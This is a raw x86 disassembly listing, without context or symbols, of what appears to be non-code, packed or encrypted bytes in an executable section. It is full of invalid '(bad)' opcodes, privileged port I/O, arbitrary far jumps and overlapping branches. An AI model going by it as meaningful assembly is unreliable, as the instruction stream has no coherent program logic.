  40369c:	or     al,dl
  40369e:	out    0xc1,eax
  4036a0:	test   edi,0xb0b6c5f7
  4036a6:	(bad)  
  4036a7:	fcomip st,st(1)
  4036a9:	clc    
  4036aa:	jmp    0xe5e0:0xf2dff5cc
  4036b1:	(bad)  
  4036b2:	mov    esp,0xf909d0fc
  4036b7:	retf   
  4036b8:	or     eax,0xee0ddae5
  4036bd:	icebp  
  4036be:	fsubp  st(5),st
  4036c0:	loopne 0x4036b9
  4036c2:	loopne 0x403679
  4036c4:	mov    ch,0xf0
  4036c6:	out    0xcc,eax
  4036c8:	jmp    0xfec8:0xf5bdd7f8
  4036cf:	mov    esi,0xc4f8c5e7
  4036d4:	retf   
  4036d5:	(bad)  
  4036d6:	cli    
  4036d7:	add    eax,0xdccedce8
  4036dc:	adc    dh,al
  4036de:	lods   eax,DWORD PTR ds:[esi]
  4036df:	mov    esp,0xefc9c9b1
  4036e4:	mov    ah,0xaf
  4036e6:	mov    eax,0xf3e4b9d0
  4036eb:	loop   0x4036d0
  4036ed:	loopne 0x4036c3
  4036ef:	push   es
  4036f0:	aam    0xc3
  4036f2:	mov    edx,0x3e1f7cb
  4036f7:	in     al,0xdb
  4036f9:	aad    0xfc
  4036fb:	std    
  4036fc:	or     esp,DWORD PTR [edi-0x52353735]
  403702:	mov    esp,0xfbf2d1fa
  403707:	mov    ch,0xb4
  403709:	repz in al,dx
  40370b:	iret   
  40370c:	int3   
  40370d:	(bad)  
  40370e:	(bad)  
  40370f:	aam    0xe1
  403711:	repz fsubr st(0),st
  403714:	or     esp,ebp
  403716:	aad    0xee
  403718:	jmp    0xf2c6:0xee0ef4db
  40371f:	lods   eax,DWORD PTR ds:[esi]
  403720:	cmc    
  403721:	mov    dl,0xd4
  403723:	mov    al,0xd9
  403725:	call   0xb9ffece3
  40372a:	fstp   st(2)
  40372c:	loop   0x40371c
  40372e:	out    dx,al
  40372f:	std    
  403730:	repz in eax,0xba
  403733:	sar    ecx,cl
  403735:	add    eax,esp
  403737:	test   cl,0xe2
  40373a:	fstp   st(4)
  40373c:	or     BYTE PTR [edx-0x1b3a1b3b],ch
  403742:	icebp  
  403743:	fcmovnbe st,st(7)
  403745:	in     al,dx
  403746:	out    0xd1,eax
  403748:	icebp  
  403749:	in     eax,dx
  40374a:	stc    
  40374b:	retf   
  40374c:	in     eax,dx
  40374d:	shl    edx,cl
  40374f:	rol    DWORD PTR [esi],0x2
  403752:	fdivr  st(3),st
  403754:	retf   0xdbc4
  403757:	aam    0xff
  403759:	out    0xe3,eax
  40375b:	add    bh,dh
  40375d:	fadd   st,st(7)
  40375f:	in     al,0xa8
  403761:	hlt    
  403762:	jmp    0x40371f
  403764:	mov    bl,0xd6
  403766:	fxch   st(6)
  403768:	mov    esi,0xb4d6f9bd
  40376d:	rol    DWORD PTR [eax],0x0
  403770:	fdivr  st(4),st
  403772:	or     ecx,DWORD PTR [edx]
  403774:	(bad)  
  403775:	stc    
  403776:	fsubr  st,st(0)
  403778:	add    ch,cl
  40377a:	enter  0xd3cc,0xde
  40377e:	fsubr  QWORD PTR [ecx+eax*8-0x4c3e122d]
  403785:	aam    0xf4
  403787:	fistp  QWORD PTR [edx-0x28fc320d]
  40378d:	aad    0xfd
  40378f:	icebp  
  403790:	(bad)  
  403792:	loopne 0x403787
  403794:	pop    es
  403795:	shl    ah,1
  403797:	fucomi st,st(6)
  403799:	add    bh,ah
  40379b:	ror    eax,cl
  40379d:	mov    bl,0xe3
  40379f:	ret    
  4037a0:	mov    dl,0xe0
  4037a2:	mov    dh,0xf3
  4037a4:	icebp  
  4037a5:	mov    al,0xf5
  4037a7:	lock div DWORD PTR [ebp-0x3d274214]
  4037ae:	fidivr DWORD PTR [eax+0xbcc6ec]
  4037b4:	aam    0xfe
  4037b6:	aad    0xfe
  4037b8:	std    
  4037b9:	add    eax,0xebefea0b
  4037be:	fcomp  st(6)
  4037c0:	lds    esi,FWORD PTR [esi-0x92e3124]
  4037c6:	idiv   ecx
  4037c8:	out    0xca,al
  4037ca:	shr    edi,1
  4037cc:	fidivr WORD PTR [eax+edi*8-0x81a2734]
  4037d3:	jecxz  0x4037b4
  4037d5:	lock fadd st(0),st
  4037d8:	into   
  4037d9:	add    esp,edi
  4037db:	int3   
  4037dc:	out    dx,al
  4037dd:	jmp    0xc2d3:0xdde6d2a8
  4037e4:	mov    al,0xe4
  4037e6:	repz fucomip st,st(5)
  4037e9:	retf   0xb4d3
  4037ec:	(bad)  
  4037ee:	mov    ebp,0xf3c2def3
  4037f3:	rcr    al,0x5
  4037f6:	pop    es
  4037f7:	or     dl,ch
  4037f9:	jmp    0x4037ff
  4037fb:	(bad)  
  4037fd:	shl    bh,cl
  4037ff:	(bad)  
  403800:	shr    dh,0xcf
  403803:	jecxz  0x4037cd
  403805:	iret   
  403806:	rcl    al,1
  403808:	enter  0xeee4,0xbe
  40380c:	faddp  st(1),st
  40380e:	loop   0x4037dd
  403810:	add    eax,0xd5c6c201
  403815:	jmp    0xe700:0x902dfd8
  40381c:	add    ecx,ecx
  40381e:	jmp    0xd0f4:0xc0f0c7e6
  403825:	rcl    edi,0xf9
  403828:	mov    edx,0xfdf3bdf2
  40382d:	mul    bh
  40382f:	ffreep st(0)
  403831:	add    eax,0xe4e7ddde
  403836:	jmp    0xedd9:0xe5c4edcf
  40383d:	(bad)
  403840:	shl    BYTE PTR [ebx-0x3549382f],cl
  403846:	aam    0xe7
  403848:	in     eax,0xcf
  40384a:	in     eax,dx
  40384b:	out    dx,eax
  40384c:	cli    
  40384d:	hlt    
  40384e:	mov    dh,0xbd
  403850:	(bad)  
  403851:	mov    esp,0x6d7fd0b
  403856:	call   0x3052125
  40385b:	(bad)  
  40385c:	(bad)  
  40385d:	(bad)  
  40385f:	int3   
  403860:	shl    eax,cl
  403862:	out    dx,al
  403863:	iret   
  403864:	retf   
  403865:	cli    
  403866:	out    0xf0,eax
  403868:	mov    esi,0xedddcbdf
  40386d:	ret    
  40386e:	call   0xf521202c
  403873:	or     ecx,DWORD PTR [ecx]
  403875:	retf   
  403876:	out    dx,eax
  403877:	jecxz  0x40387c
  403879:	clc    
  40387a:	out    0xea,eax
  40387c:	out    0xad,al
  40387e:	retf   0xd3cb
  403881:	stos   DWORD PTR es:[edi],eax
  403882:	(bad)
  403885:	lock in eax,0xd3
  403888:	(bad)  
  403889:	imul   esp
  40388b:	ret    
  40388c:	rcr    ebp,cl
  40388e:	cld    
  40388f:	ret    0xd5c1
  403892:	(bad)
  403895:	or     eax,edi
  403897:	cmc    
  403898:	cli    
  403899:	loope  0x40388e
  40389b:	cld    
  40389c:	les    ebp,FWORD PTR [edi-0x48421c16]
  4038a2:	lods   eax,DWORD PTR ds:[esi]
  4038a3:	iret   
  4038a4:	iret   
  4038a5:	mov    ecx,0xf1d8b8d6
  4038aa:	mov    eax,0xbdfcc9d6
  4038af:	icebp  
  4038b0:	fcomi  st,st(7)
  4038b2:	mov    ebp,0xf5fce3e4
  4038b7:	add    ebx,ebx
  4038b9:	std    
  4038ba:	push   es
  4038bb:	call   0xb0f8e7b3
  4038c0:	jecxz  0x4038a8
  4038c2:	ror    dl,cl
  4038c4:	mov    cl,0xc6
  4038c6:	out    0xe7,eax
  4038c8:	hlt    
  4038c9:	in     al,0x3
  4038cb:	std    
  4038cc:	std    
  4038cd:	fld1   
  4038cf:	ret    
  4038d0:	jecxz  0x4038b1
  4038d2:	pop    es
  4038d3:	add    BYTE PTR [edx],cl
  4038d5:	add    al,0xda
  4038d7:	fdiv   st(1),st
  4038d9:	add    edi,edi
  4038db:	pmulhw mm3,mm7
  4038de:	jmp    0xcbb4:0xf6d6e8a5
  4038e5:	mov    bh,0xe6
  4038e7:	mov    ebx,0xdbfde8ef
  4038ec:	(bad)  
  4038ee:	(bad)  
  4038ef:	fpatan 
  4038f1:	sti    
  4038f2:	lock loopne 0x4038ca
  4038f5:	fcmovu st,st(1)
  4038f7:	out    0xc0,al
  4038f9:	enter  0x90b,0xe2
  4038fd:	mov    edi,0xf2e5e5b3
  403902:	ret    
  403903:	loopne 0x4038c5
  403905:	in     eax,0xeb
  403907:	(bad)  
  403909:	mov    ebx,0xf603e303
  40390e:	repnz fild WORD PTR [edx]
  403911:	rol    ebx,0xdf
  403914:	(bad)  
  403915:	or     BYTE PTR [eax],al
  403917:	(bad)  
  403918:	xbegin 0xbe263807
  40391e:	mov    bl,0xee
  403920:	retf   
  403921:	ret    
  403922:	fdiv   QWORD PTR [eax-0x124e4e0d]
  403928:	cmc    
  403929:	(bad)  
  40392a:	neg    ebp
  40392c:	(bad)  
  40392d:	loope  0x4038fd
  40392f:	fst    st(0)
  403931:	in     eax,dx
  403932:	test   esp,0xfbf4f9d9
  403938:	lds    ecx,FWORD PTR [ebx]
  40393a:	repz out 0x6,al
  40393d:	shr    ebx,cl
  40393f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403940:	repz scas al,BYTE PTR es:[edi]
  403942:	scas   al,BYTE PTR es:[edi]
  403943:	out    0xf1,eax
  403945:	mov    ah,0xc0
  403947:	mov    ah,0xc4
  403949:	retf   0xffcb
  40394c:	(bad)  
  40394d:	out    dx,al
  40394e:	cli    
  40394f:	cli    
  403950:	cmc    
  403951:	mov    esi,0xe8fec1c5
  403956:	jmp    0xf8f9:0xe204fcdf
  40395d:	test   al,0xe4
  40395f:	imul   DWORD PTR [eax-0x8373a2a]
  403965:	mov    edx,0xdcfdb8d5
  40396a:	fsubr  st,st(1)
  40396c:	jmp    0xd811392e
  403971:	fcmovu st,st(3)
  403973:	jmp    0x403966
  403975:	or     ch,bh
  403977:	fucomip st,st(7)
  403979:	(bad)  
  40397a:	enter  0x4dd,0xb9
  40397e:	enter  0xace4,0xee
  403982:	aam    0xfa
  403984:	mov    ah,0xdb
  403986:	repz aam 0xe5
  403989:	rcr    ebp,1
  40398b:	mov    ebp,0xc7c20101
  403990:	int3   
  403991:	out    0xd6,eax
  403993:	or     dh,ah
  403995:	test   DWORD PTR [edi],0x6e200d4
  40399b:	jmp    0xd01e1a8e
  4039a0:	rcl    edi,0xae
  4039a3:	jmp    0x40395b
  4039a5:	mov    edx,0xd1d0b5f7
  4039aa:	repnz (bad) 
  4039ad:	cmc    
  4039ae:	cmc    
  4039af:	mov    DWORD PTR [eax],0xe5dac2d2
  4039b5:	aad    0xb
  4039b7:	loope  0x4039a4
  4039b9:	les    edx,FWORD PTR [ebx]
  4039bb:	enter  0xd2ef,0xb0
  4039bf:	in     eax,dx
  4039c0:	out    dx,al
  4039c1:	mov    ebp,0xdbeee7ef
  4039c6:	mov    ebx,0xc8f0efd7
  4039cb:	(bad)  
  4039cc:	shl    esp,cl
  4039ce:	shl    eax,cl
  4039d0:	cmc    
  4039d1:	int3   
  4039d2:	push   es
  4039d3:	in     eax,0x3
  4039d5:	ret    0xc0e7
  4039d8:	in     eax,0xe0
  4039da:	paddsw mm2,mm2
  4039dd:	(bad)
  4039e0:	test   ebp,0xf8dbb4d6
  4039e6:	retf   
  4039e7:	hlt    
  4039e8:	mov    ecx,0xfcd7becd
  4039ed:	jecxz  0x4039ac
  4039ef:	int    0xd8
  4039f1:	(bad)  
  4039f3:	(bad)  
  4039f4:	loope  0x4039bb
  4039f6:	retf   
  4039f7:	iret   
  4039f8:	leave  
  4039f9:	add    esp,edx
  4039fb:	in     eax,0xfd
  4039fd:	repz (bad) 
  4039ff:	repnz rol eax,1
  403a02:	iret   
  403a03:	lods   al,BYTE PTR ds:[esi]
  403a04:	xlat   BYTE PTR ds:[ebx]
  403a05:	mov    dh,0xb0
  403a07:	retf   
  403a08:	out    0xbd,al
  403a0a:	mov    ebx,0xfcfabfb5
  403a0f:	mov    edi,0x4e5f6fd
  403a14:	(bad)  
  403a15:	jmp    0x403a0e
  403a17:	or     eax,edi
  403a19:	jmp    0xefc1:0xeafed806
  403a20:	ffree  st(5)
  403a22:	retf   0xcdee
  403a25:	loopne 0x4039fd
  403a27:	stc    
  403a28:	mov    bh,0xd2
  403a2a:	mov    ebp,0xffcde9ea
  403a2f:	out    0xe3,al
  403a31:	jecxz  0x403a0f
  403a33:	mov    ebp,0xfef0ebdc
  403a38:	add    edx,ebx
  403a3a:	or     ah,bl
  403a3c:	jmp    0xe92dfb0a
  403a41:	in     eax,0xf3
  403a43:	in     al,dx
  403a44:	mov    bl,0xee
  403a46:	jmp    edi
  403a48:	mov    ch,0xd5
  403a4a:	out    dx,eax
  403a4b:	hlt    
  403a4c:	(bad)  
  403a4d:	sti    
  403a4e:	iret   
  403a4f:	clc    
  403a50:	repz jecxz 0x403a36
  403a53:	hlt    
  403a54:	cli    
  403a55:	ret    0xc0c5
  403a58:	or     bl,ch
  403a5a:	add    eax,0xcbb9c908
  403a5f:	out    dx,eax
  403a60:	shl    ah,1
  403a62:	out    0xb2,eax
  403a64:	shl    esp,0xd2
  403a67:	mov    bh,0xfd
  403a69:	into   
  403a6a:	fdivrp st(6),st
  403a6c:	add    dh,cl
  403a6e:	loopne 0x403a56
  403a70:	in     eax,dx
  403a71:	in     al,dx
  403a72:	in     al,dx
  403a73:	lock aam 0x3
  403a76:	retf   0x4e1
  403a79:	fucomp st(0)
  403a7b:	int3   
  403a7c:	std    
  403a7d:	fidiv  WORD PTR [eax-0x39292123]
  403a83:	mov    cl,0xf9
  403a85:	mov    dh,0xdb
  403a87:	int    0xef
  403a89:	aam    0xcb
  403a8b:	aam    0xe9
  403a8d:	mov    edi,0xe6f3daf1
  403a92:	lock (bad) 
  403a94:	cmc    
  403a95:	(bad)  
  403a97:	cld    
  403a98:	push   cs
  403a99:	aam    0xdc
  403a9b:	adc    cl,BYTE PTR [edi+ecx*8]
  403a9e:	icebp  
  403a9f:	shr    bh,1
  403aa1:	icebp  
  403aa2:	lock lock aam 0xca
  403aa6:	enter  0xecbf,0xdf
  403aaa:	(bad)  
  403aac:	aam    0xdd
  403aae:	cmc    
  403aaf:	cli    
  403ab0:	rol    BYTE PTR [edx],1
  403ab2:	cli    
  403ab3:	ret    0xf904
  403ab6:	hlt    
  403ab7:	add    eax,0xed4d50f
  403abc:	fdiv   QWORD PTR [ecx-0x341b1f31]
  403ac2:	xlat   BYTE PTR ds:[ebx]
  403ac3:	out    dx,eax
  403ac4:	in     eax,0xef
  403ac6:	mov    ah,0xe4
  403ac8:	shl    DWORD PTR [esi-0x3c07030e],cl
  403ace:	aad    0xd0
  403ad0:	repnz add dl,dh
  403ad3:	jmp    0xe5e5:0xc0ebfef6
  403ada:	add    esp,edi
  403adc:	add    al,0xca
  403ade:	mov    esi,0xf3b5c0af
  403ae3:	mov    bl,0xc4
  403ae5:	mov    ebx,0xedb7f5d3
  403aea:	retf   0xd0b8
  403aed:	shl    bl,cl
  403aef:	shr    ebp,cl
  403af1:	in     eax,0x4
  403af3:	fisttp DWORD PTR [ebx]
  403af5:	sar    ch,1
  403af7:	iret   
  403af8:	jecxz  0x403ac9
  403afa:	aam    0x0
  403afc:	add    DWORD PTR [edi-0x14390f18],esp
  403b02:	lock mov dl,0xe7
  403b05:	out    dx,eax
  403b06:	jmp    0x403ad4
  403b08:	mov    al,0xb3
  403b0a:	retf   0xfaf9
  403b0d:	fndisi(8087 only) 
  403b0f:	out    dx,eax
  403b10:	fld    DWORD PTR [esi]
  403b12:	loop   0x403b10
  403b14:	in     al,0x4
  403b16:	cli    
  403b17:	mul    dh
  403b19:	or     eax,0xeafd0a00
  403b1e:	test   al,0xcf
  403b20:	out    dx,eax
  403b21:	jmp    0xe10d22d0
  403b26:	(bad)  
  403b27:	(bad)  
  403b28:	jmp    0xee02:0xd1d1e8d0
  403b2f:	mov    esp,0x5daf7d5
  403b34:	add    al,0xf1
  403b36:	cld    
  403b37:	retf   0xebdd
  403b3a:	(bad)  
  403b3b:	in     eax,dx
  403b3c:	call   0xe2ffeb1e
  403b41:	retf   0xe6d1
  403b44:	aad    0xc6
  403b46:	mov    edx,0xe8c4e5e4
  403b4b:	mov    esp,0xdeb9d9ee
  403b50:	out    0xf7,eax
  403b52:	aad    0x2
  403b54:	(bad)  
  403b55:	jecxz  0x403b20
  403b57:	(bad)  
  403b58:	cli    
  403b59:	loopne 0x403b56
  403b5b:	fucomi st,st(0)
  403b5d:	shr    edx,0xd7
  403b60:	scas   al,BYTE PTR es:[edi]
  403b61:	leave  
  403b62:	mov    ah,0xd1
  403b64:	call   0xd427043d
  403b69:	mov    ebx,0xbcf7cdd9
  403b6e:	enter  0xbec3,0xed
  403b72:	rol    DWORD PTR [eax],1
  403b74:	icebp  
  403b75:	(bad)  
  403b76:	(bad)  
  403b78:	add    cl,BYTE PTR [ebx]
  403b7a:	fcomp  st(5)
  403b7c:	or     edi,DWORD PTR [edi-0x23344033]
  403b82:	sar    DWORD PTR [ebx-0x25051b19],0xcd
  403b89:	mov    ah,0xf5
  403b8b:	icebp  
  403b8c:	aad    0xdd
  403b8e:	(bad)  
  403b8f:	mov    eax,0xbd4fad9
  403b94:	fsub   st,st(7)
  403b96:	or     edi,ecx
  403b98:	aad    0xc4
  403b9a:	ret    0xc0e
  403b9d:	test   eax,0xd2ccd7e9
  403ba2:	mov    dl,0xc0
  403ba4:	enter  0xd9cc,0xc8
  403ba8:	out    dx,al
  403ba9:	int3   
  403baa:	jmp    0xc0d1:0xf8bfecd9
  403bb1:	push   es
  403bb2:	loope  0x403b7f
  403bb4:	or     ah,ah
  403bb6:	jmp    0xe10f:0xdbddd900
  403bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bbe:	out    0xb2,al
  403bc0:	mov    esi,0xeed1b1ce
  403bc5:	retf   0xd9eb
  403bc8:	in     eax,0xdd
  403bca:	cld    
  403bcb:	cmc    
  403bcc:	aam    0xfd
  403bce:	int    0xfb
  403bd0:	mul    edx
  403bd2:	mov    edx,0xe8d5d2fc
  403bd7:	xlat   BYTE PTR ds:[ebx]
  403bd8:	out    dx,al
  403bd9:	cli    
  403bda:	or     ebp,edi
  403bdc:	vpslld xmm6,xmm6,xmm0
  403be1:	hlt    
  403be2:	loopne 0x403bb0
  403be4:	mov    bl,0xc7
  403be6:	jmp    0xd00621e2
  403beb:	fst    st(1)
  403bed:	stc    
  403bee:	iret   
  403bef:	iret   
  403bf0:	xlat   BYTE PTR ds:[ebx]
  403bf1:	cld    
  403bf2:	fstp   TBYTE PTR [ecx+0x3cb04df]
  403bf8:	add    al,0xec
  403bfa:	loopne 0x403bfc
  403bfc:	fucomip st,st(1)
  403bfe:	lods   al,BYTE PTR ds:[esi]
  403bff:	div    DWORD PTR [esi-0x4408234e]
  403c05:	xlat   BYTE PTR ds:[ebx]
  403c06:	xlat   BYTE PTR ds:[ebx]
  403c07:	mov    ah,0xdb
  403c09:	int3   
  403c0a:	enter  0xccca,0xcd
  403c0e:	ret    
  403c0f:	clc    
  403c10:	loopne 0x403c11
  403c12:	in     al,dx
  403c13:	fcomi  st,st(6)
  403c15:	(bad)  
  403c16:	les    ecx,FWORD PTR [ebx]
  403c18:	in     eax,0xce
  403c1a:	std    
  403c1b:	fimul  WORD PTR [esi]
  403c1d:	out    dx,al
  403c1e:	mov    ebp,0xc8abc1a5
  403c23:	retf   0xcbe2
  403c26:	shr    dl,1
  403c28:	(bad)  
  403c29:	in     eax,dx
  403c2a:	aad    0xcb
  403c2c:	aam    0xbb
  403c2e:	enter  0xece1,0x4
  403c32:	repz add ebp,ebx
  403c35:	or     ch,bl
  403c37:	xlat   BYTE PTR ds:[ebx]
  403c38:	hlt    
  403c39:	add    esp,ecx
  403c3b:	or     esi,ebp
  403c3d:	in     al,0xeb
  403c3f:	icebp  
  403c40:	ret    0xe1d1
  403c43:	out    0xc6,al
  403c45:	mov    ecx,0xfbfefaee
  403c4a:	div    ah
  403c4c:	ret    
  403c4d:	aam    0xed
  403c4f:	(bad)  
  403c50:	inc    DWORD PTR [ecx]
  403c52:	lock fsubrp st(5),st
  403c55:	jecxz  0x403c57
  403c57:	loop   0x403c37
  403c59:	enter  0xd307,0xe1
  403c5d:	jecxz  0x403c26
  403c5f:	out    dx,al
  403c60:	(bad)  
  403c61:	loop   0x403c24
  403c63:	retf   
  403c64:	in     eax,dx
  403c65:	test   esi,0xcdb3f8e4
  403c6b:	lock aam 0xd4
  403c6e:	out    dx,al
  403c6f:	repz mov eax,0x4dbe005
  403c75:	leave  
  403c76:	retf   0x30f
  403c79:	(bad)  
  403c7a:	int3   
  403c7b:	jmp    0xafd7:0xc2b3dd00
  403c82:	xlat   BYTE PTR ds:[ebx]
  403c83:	jmp    0xdaf4:0xedb7bbd3
  403c8a:	cli    
  403c8b:	mov    ch,0xd9
  403c8d:	add    ebx,edx
  403c8f:	jecxz  0x403c94
  403c91:	aam    0xcc
  403c93:	add    eax,DWORD PTR [ecx]
  403c95:	in     eax,0xd4
  403c97:	add    al,0xe2
  403c99:	int    0xff
  403c9b:	fiadd  WORD PTR ds:0xe2bfedcd
  403ca1:	cmc    
  403ca2:	mov    al,0xbb
  403ca4:	call   0xd9283c90
  403ca9:	mov    edi,0xc8cacdd8
  403cae:	pop    es
  403caf:	ret    
  403cb0:	cli    
  403cb1:	cld    
  403cb2:	(bad)  
  403cb3:	xlat   BYTE PTR ds:[ebx]
  403cb4:	std    
  403cb5:	out    0xd8,al
  403cb7:	jmp    0xd011:0xd9cd09ea
  403cbe:	repz repz (bad) 
  403cc1:	rcl    ah,1
  403cc3:	loop   0x403cad
  403cc5:	(bad)  
  403cc7:	in     eax,dx
  403cc8:	mov    eax,0xedb9d0f7
  403ccd:	stc    
  403cce:	call   0xe7252ec5
  403cd3:	fdiv   st,st(7)
  403cd5:	clc    
  403cd6:	jmp    0x403cb7
  403cd8:	or     bh,dh
  403cda:	std    
  403cdb:	or     DWORD PTR ds:0xeeefd1c5,ecx
  403ce1:	retf   0xacd3
  403ce4:	leave  
  403ce5:	rcr    al,cl
  403ce7:	in     eax,dx
  403ce8:	std    
  403ce9:	hlt    
  403cea:	std    
  403ceb:	add    edi,DWORD PTR [edi+edi*4-0x442321f]
  403cf2:	hlt    
  403cf3:	add    al,dl
  403cf5:	(bad)  
  403cf6:	jmp    0x403cc0
  403cf8:	pop    es
  403cf9:	enter  0xfce2,0xda
  403cfd:	mov    ecx,0xe4d5cacb
  403d02:	stos   BYTE PTR es:[edi],al
  403d03:	retf   
  403d04:	vpsubsw xmm6,xmm2,XMMWORD PTR [esi+0x3e4c4b4]
  403d0c:	add    al,BYTE PTR [edx]
  403d0e:	ret    0xcec7
  403d11:	add    ch,ah
  403d13:	(bad)  
  403d14:	fdivp  st(6),st
  403d16:	mov    BYTE PTR [esi],0xe2
  403d19:	push   es
  403d1a:	out    0xee,al
  403d1c:	loope  0x403d0c
  403d1e:	(bad)  
  403d20:	cmc    
  403d21:	loope  0x403d11
  403d23:	int    0xe2
  403d25:	iret   
  403d26:	fdivr  DWORD PTR [ecx-0x261b0235]
  403d2c:	in     al,dx
  403d2d:	call   0xf9440124
  403d32:	mov    BYTE PTR [esi],0xe1
  403d35:	std    
  403d36:	test   al,0xf9
  403d39:	add    al,0xec
  403d3b:	shr    ebp,cl
  403d3d:	int    0xd2
  403d3f:	shr    ch,0xcd
  403d42:	aad    0xb3
  403d44:	(bad)
  403d47:	mov    cl,0xfb
  403d49:	(bad)  
  403d4a:	leave  
  403d4b:	ret    
  403d4c:	test   esp,0xbedccee0
  403d52:	add    edx,esp
  403d54:	or     cl,BYTE PTR [ebx]
  403d56:	loop   0x403d40
  403d58:	loop   0x403d55
  403d5a:	out    0xed,eax
  403d5c:	in     al,0xcf
  403d5e:	jmp    0xe90c144b
  403d63:	(bad)  
  403d64:	lock div esp
  403d67:	int    0xb8
  403d69:	fcmove st,st(7)
  403d6b:	jecxz  0x403d30
  403d6d:	in     eax,dx
  403d6e:	sti    
  403d6f:	fmul   st(6),st
  403d71:	loopne 0x403d7a
  403d73:	xlat   BYTE PTR ds:[ebx]
  403d74:	add    cl,BYTE PTR [eax]
  403d76:	retf   0xf60a
  403d79:	fsubr  st,st(5)
  403d7b:	out    dx,al
  403d7c:	out    dx,al
  403d7d:	fst    st(7)
  403d7f:	test   eax,0xd7b5cac4
  403d84:	(bad)  
  403d85:	in     al,0xf3
  403d87:	mov    ah,0xd6
  403d89:	in     eax,0xd8
  403d8b:	mov    ch,0xf3
  403d8d:	int3   
  403d8e:	repz fdiv st(7),st
  403d91:	(bad)  
  403d92:	out    0xa,al
  403d94:	jmp    0x403d93
  403d96:	retf   
  403d97:	ror    DWORD PTR [edi],0xe
  403d9a:	pop    es
  403d9b:	or     eax,edi
  403d9d:	loop   0x403d96
  403d9f:	scas   eax,DWORD PTR es:[edi]
  403da0:	repz ret 
  403da2:	fcmovnbe st,st(5)
  403da4:	neg    dl
  403da6:	mov    al,0xd3
  403da8:	cmc    
  403da9:	fsub   st(7),st
  403dab:	fdiv   st,st(3)
  403dad:	mov    edx,0xe5e0daf0
  403db2:	ret    0xfbde
  403db5:	ffreep st(0)
  403db7:	fstp   st(3)
  403db9:	or     cl,dl
  403dbb:	fmul   DWORD PTR [edx]
  403dbd:	in     eax,0xe8
  403dbf:	test   al,0xf3
  403dc1:	retf   
  403dc2:	imul   ebp
  403dc4:	stc    
  403dc5:	leave  
  403dc6:	enter  0xe5f0,0xcd
  403dca:	stc    
  403dcb:	mov    ch,0x1
  403dcd:	rcl    eax,0x7
  403dd0:	fcmovb st,st(2)
  403dd2:	(bad)  
  403dd3:	(bad)  
  403dd4:	loop   0x403dcd
  403dd6:	fcmovu st,st(0)
  403dd8:	or     cl,ch
  403dda:	retf   
  403ddb:	(bad)
  403dde:	out    dx,al
  403ddf:	jecxz  0x403dc2
  403de1:	lods   al,BYTE PTR ds:[esi]
  403de2:	jmp    0x403d8d
  403de4:	rcr    ecx,0xe7
  403de7:	xlat   BYTE PTR ds:[ebx]
  403de8:	div    ebx
  403dea:	mov    esi,0xfccdd3cc
  403def:	ret    
  403df0:	rol    DWORD PTR ds:0xc1c0bcdc,cl
  403df6:	add    esp,esp
  403df8:	jmp    0xb1be:0x130beafe
  403dff:	out    0xad,al
  403e01:	mov    dl,0xcd
  403e03:	shl    DWORD PTR [esi-0x312e3951],cl
  403e09:	out    dx,al
  403e0a:	cld    
  403e0b:	in     al,dx
  403e0c:	mov    edi,0xdec3f2d7
  403e11:	mov    esp,0xbc4e207
  403e16:	ror    BYTE PTR [ecx],0xdb
  403e19:	clc    
  403e1a:	in     eax,dx
  403e1b:	out    dx,al
  403e1c:	push   es
  403e1d:	jmp    0xcae3:0xbdeeecbd
  403e24:	mov    bh,0xf2
  403e26:	rcr    eax,cl
  403e28:	(bad)  
  403e29:	in     al,0xdc
  403e2b:	sti    
  403e2c:	loop   0x403e04
  403e2e:	loope  0x403e24
  403e30:	loop   0x403e30
  403e32:	ret    0xe3c7
  403e35:	out    0xfc,eax
  403e37:	(bad)  
  403e38:	cli    
  403e39:	out    0x9,al
  403e3b:	or     esi,edi
  403e3d:	lock jmp 0xf4fa:0xd6efe1c0
  403e45:	fcmovnu st,st(3)
  403e47:	int3   
  403e48:	aam    0xed
  403e4a:	mov    ah,0xf8
  403e4c:	cli    
  403e4d:	fcomp  st(6)
  403e4f:	out    0x5,al
  403e51:	fsin   
  403e53:	(bad)  
  403e55:	fld    st(0)
  403e57:	add    BYTE PTR [esi],cl
  403e59:	push   cs
  403e5a:	std    
  403e5b:	or     al,0x3
  403e5d:	test   al,0xd0
  403e5f:	(bad)  
  403e60:	out    dx,al
  403e61:	mov    dh,0xad
  403e63:	ret    
  403e64:	mov    bh,0xf3
  403e66:	cli    
  403e67:	fcmovne st,st(4)
  403e69:	neg    esi
  403e6b:	stc    
  403e6c:	jmp    0xf3f0:0xf6d1efef
  403e73:	add    eax,DWORD PTR [esi]
  403e75:	inc    bh
  403e77:	out    0xd6,eax
  403e79:	or     BYTE PTR [ecx*1-0x514f131c],cl
  403e80:	mov    esi,0xc8f2f7bc
  403e85:	stc    
  403e86:	fistp  QWORD PTR [edi-0x9304847]
  403e8c:	cli    
  403e8d:	out    dx,eax
  403e8e:	mov    esp,0xf2fed3fd
  403e93:	in     eax,0xd0
  403e95:	or     cl,ah
  403e97:	(bad)  
  403e99:	jmp    0xce045268
  403e9e:	mov    eax,0xadc7c7d2
  403ea3:	jmp    0x403e9e
  403ea5:	iret   
  403ea6:	out    dx,al
  403ea7:	(bad)  
  403ea8:	jmp    0xedfcf397
  403ead:	fdivr  QWORD PTR [edx-0x2d0d0e26]
  403eb3:	out    0xc3,eax
  403eb5:	(bad)  
  403eb7:	jecxz  0x403e95
  403eb9:	loope  0x403e97
  403ebb:	or     BYTE PTR [ecx],al
  403ebd:	out    0xc3,al
  403ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ec0:	mov    ebp,0xe7c1e1d3
  403ec5:	jmp    0xf7d3:0xfcbff6b8
  403ecc:	jmp    0xdcd8:0xbef101ff
  403ed3:	shl    ecx,0xf0
  403ed6:	pop    es
  403ed7:	(bad)  
  403ed8:	cld    
  403ed9:	in     eax,dx
  403eda:	clc    
  403edb:	cli    
  403edc:	clc    
  403edd:	(bad)
  403ee0:	in     al,dx
  403ee1:	mov    bh,0xf0
  403ee3:	out    dx,eax
  403ee4:	cli    
  403ee5:	rcl    esi,cl
  403ee7:	mov    dh,0xee
  403ee9:	call   0xed1e17eb
  403eee:	int3   
  403eef:	fcmovne st,st(6)
  403ef1:	add    eax,0xe3ebb9ec
  403ef6:	psraw  mm4,mm2
  403ef9:	fucomip st,st(5)
  403efb:	out    dx,al
  403efc:	retf   
  403efd:	shl    eax,0xf6
  403f00:	test   al,0xcd
  403f02:	ror    cl,cl
  403f04:	int3   
  403f05:	repz fidiv DWORD PTR [edi+ebx*8-0x221c3311]
